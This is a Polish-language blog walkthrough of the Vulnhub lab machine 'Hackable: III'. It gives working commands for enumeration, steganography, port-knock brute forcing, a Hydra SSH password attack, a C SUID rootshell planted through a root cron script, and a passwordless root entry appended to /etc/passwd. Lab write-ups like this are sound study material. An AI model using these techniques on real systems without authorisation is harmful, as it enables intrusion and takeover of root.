---
title: "Hackable: III"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough  
tags:
  - Hacking
  - Vulnhub
  - Walkthrough
  - Hackable  
redirect_from:
  - /hacking/hackable-iii/
  - /hacking/walkthrough/hackable-iii/
header:
  overlay_image: /assets/images/pasek-hack.png
gallery1_2:
  - url: /assets/images/hacking/2021/06/01.png
    image_path: /assets/images/hacking/2021/06/01.png
  - url: /assets/images/hacking/2021/06/02.png
    image_path: /assets/images/hacking/2021/06/02.png
gallery3:
  - url: /assets/images/hacking/2021/06/03.png
    image_path: /assets/images/hacking/2021/06/03.png
gallery4_5:
  - url: /assets/images/hacking/2021/06/04.png
    image_path: /assets/images/hacking/2021/06/04.png
  - url: /assets/images/hacking/2021/06/05.png
    image_path: /assets/images/hacking/2021/06/05.png
---
# Hackable: III
Write-up is in Polish language.

# Metainfo

|:----|:----|
|Nazwa:|Hackable: III|
|Autor:|[Elias-sousa](https://www.vulnhub.com/author/elias-sousa,804/)|
|Wypuszczony:|2021-06-02|
|Do ściągnięcia:|[Vulnhub](https://www.vulnhub.com/entry/hackable-iii,720)|
|Poziom:|Średni|
|System:|Linux|
|Nauczysz się:|Metasploit, Brainfuck, Steghide, Rootshell, C|

# Wstęp
[Hackable III](https://www.vulnhub.com/entry/hackable-iii,720/)  jest najnowszą maszyną od [Eliasa Soulsa](https://www.vulnhub.com/author/elias-sousa,804/) (stan na lipiec 2021). Oznaczona jest poziomem **medium**. Nie jest tak łatwa, jak opisywane wcześniej maszynki. Jest bardzo podchwytliwa i straciłem nad nią dosyć dużo czasu, ale człowiek uczy się całe życie. **Metasploita** będę używał, ale nie jest on tutaj głównym narzędziem. Mała uwaga, na **XCP-ng** musisz nazwę interfejsu sieciowego zmienić w dwóch miejscach. Rozwiązanie podaje na końcu, gdyż to może komuś zepsuć zabawę.
{: .text-justify}
## Zaczynamy
```bash
msf6 > db_nmap -A -p- 172.16.1.103
host          port  proto  name  state     info
----          ----  -----  ----  -----     ----
172.16.1.103  22    tcp    ssh   filtered
172.16.1.103  80    tcp    http  open      Apache httpd 2.4.46 (Ubuntu)
```
Mamy dwa porty, 80 i 22. Jeden jest filtrowany. Zacznijmy od www. Wchodząc na stronę mamy takie coś (Kierujemy się na górny lewy róg) i mamy menu.
{: .text-justify}
{% include gallery id="gallery1_2"  %}
Logowanie nic nam nie daje. W kodzie źródłowym (_http://172.16.1.103/login_page/login.html_) jest informacja, że to może do końca nie działać: *This page is not ready, may give error*. Bawiąc się **Burpsuite**m i odpalając powyższy link, **Burpsuite** kieruje nas do _http://172.16.1.103/login.php_, a tam jest coś dziwnego, zamiast wyniku z logowania, dostajemy kod źródłowy w **PHP**. Z początku myślałem, że to jest ułatwienie dla pentestera i **PHP** nam wyświetla tę informacje, żeby ułatwić zadanie, ale nie. Niezależnie jakie parametry podasz, to jest zwykły kod w **HTML**, tyle że ma rozszerzenie _.php_! Na nic się zda wstrzykiwanie parametrów. Zanim do tego doszedłem minęło trochę czasu, ale to był ciekawy pomysł autora.
{: .text-justify}
{% include gallery id="gallery3"  %}
Sprawdźmy co jest jeszcze na na tym serwerze **WWW**:
{: .text-justify}
```bash
# root@kali:/home/szikers# gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.16.1.103 -x php,txt,html,htm,png,jpg,
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.1.103
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html,htm,png,jpg,
[+] Timeout:                 10s
===============================================================
2021/07/30 18:44:19 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1095]
/home.html            (Status: 200) [Size: 11327]
/login.php            (Status: 200) [Size: 487]
/3.jpg                (Status: 200) [Size: 61259]
/css                  (Status: 301) [Size: 310] [--> http://172.16.1.103/css/]
/js                   (Status: 301) [Size: 309] [--> http://172.16.1.103/js/]
/config               (Status: 301) [Size: 313] [--> http://172.16.1.103/config/]
/config.php           (Status: 200) [Size: 507]
/backup               (Status: 301) [Size: 313] [--> http://172.16.1.103/backup/]
/robots.txt           (Status: 200) [Size: 33]
/imagens              (Status: 301) [Size: 314] [--> http://172.16.1.103/imagens/]
/login_page           (Status: 301) [Size: 317] [--> http://172.16.1.103/login_page/]
/server-status        (Status: 403) [Size: 277]

===============================================================
2021/07/30 18:48:55 Finished
=============================================================== 
```
## Zawartość
<div class="notice--primary" markdown="1">
http://172.16.1.103/backup/
<pre>
<p style="background-color:white;">
wordlist.txt
</p>
</pre>
</div>
<div class="notice--primary" markdown="1">
http://172.16.1.103/config/
<pre>
<p style="background-color:white;">
1.txt
</p>
</pre>
</div>

Szybkie dekodowanie:
```bash
# wget http://172.16.1.103/config/1.txt
# echo MTAwMDA= | base64 -d
10000
```
<div class="notice--primary" markdown="1">
http://172.16.1.103/css/
<pre>
<p style="background-color:white;">
2.txt
</p>
</pre>
</div>

W **2.txt** jest kod w Brainfuck (**++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>------------------....**) Można to odkodować poprzez stronę, albo przez program Beef.
{: .text-justify}
```bash
# root@kali:/home/szikers# beef 2.txt
4444
```
_http://172.16.1.103/3.jpg_ jest to plik graficzny, a w nim pewnie ukryty przekaz. Nie miałem wcześniej do czynienia z łamaniem obrazków, więc nie rozkminiłem tej zagadki, ale **Elias Sousa** mi podpowiedział. 
{: .text-justify}
**Binwalk** nie znalazł nic ciekawego.
{: .text-justify}
```bash
# root@kali:/home/szikers/hackable3/3# binwalk 3.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

```
Za to **Steghide** już coś pokazał:
```bash
# root@kali:/home/szikers/hackable3/3# steghide info 3.jpg
"3.jpg":
  format: jpeg
  capacity: 3.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file "steganopayload148505.txt":
    size: 12.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
root@kali:/home/szikers/hackable3/3# steghide extract -sf 3.jpg
Enter passphrase:
wrote extracted data to "steganopayload148505.txt".
root@kali:/home/szikers/hackable3/3# cat steganopayload148505.txt
porta:65535 root@kali:/home/szikers/hackable3/3#
root@kali:/home/szikers/hackable3/3#
```
Przy okazji mamy podpowiedź, że chodzi o **port 65535**:
{: .text-justify}
Podsumowując mamy:
- 10000
- 4444
- 65535

## Knockd 
Zanim znalazłem trzecią cyfrę w obrazku, użyłem metody brute-force. Jest ona powolna i robiona na siłę, ale działa.
{: .text-justify}
{: .notice--info}
Spróbowałem wejść przez **SSH**, ale była blokada. Jeszcze raz przejrzałem kody, przeczytałem notatkę: *Please, jubiscleudo, don't forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com*  i nagle mnie olśniło. Do blokowania **SSH** używa się **Knockd** (Trzeba zainstalować w **Kali**). Bez podania odpowiednich „zapukań” dostęp do **SSH** będzie utrudniony. Zazwyczaj podaje się 3 parametry w przeciągu 5 sekund. Dwa pierwsze mamy. **10000** i **4444**. Trzeci być może gdzieś jest w tej maszynie, szukałem w pliku _3.jpg_, ale nie znalazłem. Nie mamy trzeciego numeru, ale możemy spróbować bruteforce, chociaż to może potrwać parę dni. Jest 65536 możliwości (0-65535) na znalezienie trzeciej liczby. Napisałem szybko skrypcik.
{: .text-justify}
```bash
#!/bin/bash
for i in {0..65535}; do
knock -v 172.16.1.103 10000 4444 $i
sleep 5
done
```
I co? Nie działa (prawdę mówiąc nie czekałem tyle dni). Niestety to była wina maszyny i **XCP-ng**. Znalazłem w logach, że **Knockd** nasłuchiwał na _ensp03_. Niestety wszedłem sztuczką na **root**a i zamieniłem w konfigu _ensp03_ na _eth0_. Po zakończeniu działania powyższego skryptu **SSH** wpuścił mnie! Jak nie chcesz czekać na wynik, możesz od razu zastukać:
{: .text-justify}
```bash
# knock -v 172.16.1.103 10000 4444 65535
```
## Hydra 
Użytkownikiem zapewne jest **jubiscleudo**, a hasło pewnie jest w _wordlist.txt_. Użyjmy **Hydry**:
{: .text-justify}
```bash
# hydra -V -T 64 ssh://172.16.1.103 -l jubiscleudo -P wordlist.txt

[ATTEMPT] target 172.16.1.103 - login "jubiscleudo" - pass "maria" - 204 of 303 [child 15] (0/3)
[ATTEMPT] target 172.16.1.103 - login "jubiscleudo" - pass "onlymy" - 205 of 303 [child 13] (0/3)
[ATTEMPT] target 172.16.1.103 - login "jubiscleudo" - pass "gabriela" - 206 of 303 [child 4] (0/3)
...
[22][ssh] host: 172.16.1.103   login: jubiscleudo   password: onlymy
```
Jak widzimy mamy użytkownika **jubiscleudo** i hasło **onlymy**. Wejdźmy na Shella.
{: .text-justify}
## Shelltris
W katalogu _scripts_ jest plik _tetris.sh_. Po uruchomieniu brakuje w nim pliku getch i program blokuje cały system. Popatrzyłem na kod źródłowy i zobaczyłem, że oryginalny nazywa się **ShellTris**. Ściągnałem cały [kod](https://shellscriptgames.com/shelltris/tarballs/shelltris-1.1.tar.gz). Skompilowałem na swoim shellu plik _getch.c_. I nic. Nie ma **root**a. Pliki mają identyczną zawartość, ale być coś może nasłuchuje i sprawdza? (**Elias Souls** mi wspomniał, że **Shelltris** to pułapka) 😏
{: .text-justify}
{% include gallery id="gallery4_5"  %}
## Zostawcie Shelltris w spokoju 
**Shelltris** to pułapka, zostawcie to. Wcześniej pominąłem jedną ważną rzecz, a to mnie zablokowało na dłużej. Co prawda podpatrzyłem w [solucji](https://nepcodex.com/2021/07/hackable-iii-walkthrough-vulnhub/) tylko tą jedną rzecz, bo i tak rozwiązanie jest inne i **Eliasa Soulsa** też coś pokazał, ale zrobiłem to po swojemu. Jeszcze raz przeszedłem do katalogu _/var/www/html_
{: .text-justify}
```bash
# jubiscleudo@ubuntu20:/var/www/html$ ls -la
total 128
drwxr-xr-x 8 root     root      4096 Jul 30 18:30 .
drwxr-xr-x 3 root     root      4096 Apr 29 16:13 ..
-rw-r--r-- 1 www-data www-data 61259 Apr 21 14:23 3.jpg
drwxr-xr-x 2 www-data www-data  4096 Apr 23 16:05 backup
-r-xr-xr-x 1 www-data www-data   522 Apr 29 15:41 .backup_config.php
drwxr-xr-x 2 www-data www-data  4096 Apr 29 15:41 config
-rw-r--r-- 1 www-data www-data   507 Apr 23 14:52 config.php
drwxr-xr-x 2 www-data www-data  4096 Apr 21 18:16 css
-rw-r--r-- 1 www-data www-data 11327 Jun 30 20:37 home.html
drwxr-xr-x 2 www-data www-data  4096 Apr 21 18:10 imagens
-rw-r--r-- 1 www-data www-data  1095 Jun 30 20:43 index.html
drwxr-xr-x 2 www-data www-data  4096 Apr 20 14:54 js
drwxr-xr-x 5 www-data www-data  4096 Jun 30 20:37 login_page
-rw-r--r-- 1 www-data www-data   487 Apr 23 14:33 login.php
-rw-r--r-- 1 www-data www-data    33 Apr 21 17:58 robots.txt
-rw-r--r-- 1 root     root        24 Jul 30 18:30 test.php
```
Pominąłem _.backup_config.php_, a w nim jest login i hasło dla użytkownika **hackable_3**
{: .text-justify}
<div class="notice--primary" markdown="1">
.backup_config.php
```php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'hackable_3');
define('DB_PASSWORD', 'TrOLLED_3');
define('DB_NAME', 'hackable');

/* Attempt to connect to MySQL database */
$conexao = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);


// Check connection
if($conexao === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
} else {
}
?>
```
</div>
## Grupa adm
Logując się na **Shell**a użytkownika **hackable_3** i wypisując komendę **id** zauważyłem takie coś:
{: .text-justify}
```bash
# hackable_3@ubuntu20:/var/www/html$ id
uid=1000(hackable_3) gid=1000(hackable_3) groups=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
Konto **hackable_3** jest w grupie **adm**. Poszukajmy, to może coś znajdziemy ciekawego:
{: .text-justify}
```bash
# hackable_3@ubuntu20:/var/www/html$ grep adm /etc/group
...
adm:x:4:syslog,hackable_3
hackable_3@ubuntu20:/var/www/html$
...
```
```bash
# hackable_3@ubuntu20:/var/www/html$ find / -group adm 2>/dev/null
/var/log/cloud-init-output.log
/var/log/dmesg.3.gz
/var/log/auth.log.1
/var/log/syslog.1
/var/log/auth.log.4.gz
/var/log/auth.log.3.gz
/var/log/syslog
/var/log/dmesg.0
/var/log/auth.log.2.gz
```
```bash
# hackable_3@ubuntu20:/var/log$ cat syslog
Aug 10 22:24:01 ubuntu20 CRON[5133]: (root) CMD (python3 /scripts/to_hackable_3.py)
Aug 10 22:26:01 ubuntu20 CRON[5141]: (root) CMD (python3 /scripts/to_hackable_3.py)
Aug 10 22:28:01 ubuntu20 CRON[5149]: (root) CMD (python3 /scripts/to_hackable_3.py)
Aug 10 22:30:01 ubuntu20 CRON[5156]: (root) CMD (python3 /scripts/to_hackable_3.py)
Aug 10 22:32:01 ubuntu20 CRON[5162]: (root) CMD (python3 /scripts/to_hackable_3.py)
Aug 10 22:34:01 ubuntu20 CRON[5170]: (root) CMD (python3 /scripts/to_hackable_3.py)
Aug 10 22:36:01 ubuntu20 CRON[5187]: (root) CMD (python3 /scripts/to_hackable_3.py)
Aug 10 22:38:01 ubuntu20 CRON[5193]: (root) CMD (python3 /scripts/to_hackable_3.py)
Aug 10 22:40:01 ubuntu20 CRON[5201]: (root) CMD (python3 /scripts/to_hackable_3.py)
```
## Rootshell
**Crontab** nie może uruchomić z **root**a programu _/scripts/to_hackable_3.py_. Akcja działa co 2 minuty. Pomóżmy mu, aby się **Crontab** nie męczył. :smiley: Ale zanim to nastąpi skompilujmy u siebie na konsoli (niestety nie mamy tutaj _gcc_) prosty **rootshell** napisany w języku **C** i wrzućmy go na konto. A czemu tak się bawić? Zwykłe skrypty z ustawionym bitem Suid nie przechodzą na **root**a z innego użytkownika, więc najlepiej napisać program i go skompilować:
{: .text-justify}
<div class="notice--primary" markdown="1">
rootshell
```c
void main()
{ setuid(0);
  setgid(0);
  system("/bin/bash");
}
```
</div>
**Rootshell** wrzucamy do katalogu:
{: .text-justify}
```bash
# cp /home/hackable_3/rootshell /scripts/
```
A zawartość **/scripts/to_hackable_3.py** może wyglądać tak:
{: .text-justify}
<div class="notice--primary" markdown="1">
to_hackable_3.py
```python
from os import system
system('chown root:root /scripts/rootshell && chmod u+s /scripts/rootshell')
```
</div>
Czekamy z 2 minuty, aby **Crontab** odwalił za nas robotę:
{: .text-justify}
```bash
# hackable_3@ubuntu20:/scripts$ ls -la
total 100
drwxr-xr-x  2 hackable_3 hackable_3  4096 Aug 10 23:06 .
drwxr-xr-x 21 root       root        4096 Apr 29 16:32 ..
-rw-r--r--  1 root       root         105 Jun 30 20:45 README.txt
-rwsr-xr-x  1 root       root       16712 Aug 10 21:39 rootshell
-rw-r--r--  1 hackable_3 hackable_3  1300 Aug 10 16:30 shadow
-rwxr-xr-x  1 root       root       59653 Apr 28 15:06 tetris.sh
-rwxrwxr-x  1 hackable_3 hackable_3   251 Aug 10 21:59 to_hackable_3.py
```
**Rootshell** ma **Suid**a i **Root**a:
```bash
# hackable_3@ubuntu20:/scripts$ ./rootshell
# root@ubuntu20:/scripts# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd),1000(hackable_3)
```
Zamiast tworzyć **Rootshell**, to możemy dodać użytkownika do pliku **/etc/passwd**:
{: .text-justify}
```bash
# echo 'kerszi::0:0:,,,:/root:/bin/bash' >> /etc/passwd
```
## Parę słów na koniec
Uwaga, jeżeli chcesz, żeby ta maszyna działała na **XCP-ng** trzeba podczas startu systemu zmienic w **Grub**ie **ro** na **rw init=/bin/bash**, potem **F10**. To było w **Grub**ie. W **Linux**ie zaś w **/etc/netplan/00-installer-config.yaml** zmieniamy sieciówkę na interfejs **eth0**. Dodatkowo należy zmienić w **/etc/default/knockd na KNOCKD_OPTS="-i eth0"**.
{: .text-justify}
{: .notice--danger}
Jeżeli się podobała solucja, to napisz na [kerszi@protonmail.com](mailto:kerszi@protonmail.com).
{: .text-justify}
